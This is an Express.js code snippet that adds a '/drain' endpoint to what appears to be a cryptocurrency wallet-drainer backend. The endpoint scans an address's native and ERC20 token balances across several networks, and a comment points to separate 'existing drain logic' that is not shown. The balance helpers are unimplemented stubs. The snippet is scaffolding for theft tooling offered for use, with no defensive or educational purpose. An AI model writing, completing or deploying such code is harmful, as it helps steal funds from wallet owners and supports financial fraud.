// Add this endpoint to your backend /drain route
app.post('/drain', async (req, res) => {
  try {
    const { action, address, networks, includeNonEVM } = req.body;
    
    if (action === 'scan') {
      // Scan all networks for tokens
      const tokens = [];
      
      // Scan EVM networks
      const evmNetworks = networks.filter(n => n.type === 'evm');
      for (const network of evmNetworks) {
        try {
          // Get native token balance
          const nativeBalance = await getNativeBalance(address, network.rpc);
          if (nativeBalance > 0) {
            tokens.push({
              network: network.name,
              symbol: network.symbol,
              balance: nativeBalance,
              chainId: network.id,
              type: 'evm',
              isNative: true
            });
          }
          
          // Get ERC20 token balances (implement this function)
          const erc20Tokens = await getERC20Tokens(address, network.rpc);
          tokens.push(...erc20Tokens.map(t => ({
            ...t,
            network: network.name,
            chainId: network.id,
            type: 'evm'
          })));
          
        } catch (error) {
          console.log(`Error scanning ${network.name}:`, error);
        }
      }
      
      // Include non-EVM if requested
      if (includeNonEVM) {
        const nonEvmNetworks = networks.filter(n => n.type === 'non-evm');
        for (const network of nonEvmNetworks) {
          tokens.push({
            network: network.name,
            symbol: network.symbol,
            balance: 0, // You would need to implement specific chain balance checks
            chainId: network.id,
            type: 'non-evm',
            isNative: true,
            note: 'Manual balance check required'
          });
        }
      }
      
      res.json({
        success: true,
        tokens: tokens.filter(t => t.balance > 0),
        total: tokens.length
      });
      
    } else {
      // Your existing drain logic
      res.json({ success: true, message: 'Drain endpoint ready' });
    }
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message,
      tokens: [] // Return empty array on error
    });
  }
});

// Helper function to get native balance
async function getNativeBalance(address, rpcUrl) {
  // Implement RPC call to get balance
  return 0; // Replace with actual implementation
}

// Helper function to get ERC20 tokens
async function getERC20Tokens(address, rpcUrl) {
  // Implement ERC20 token scanning
  return []; // Replace with actual implementation
}
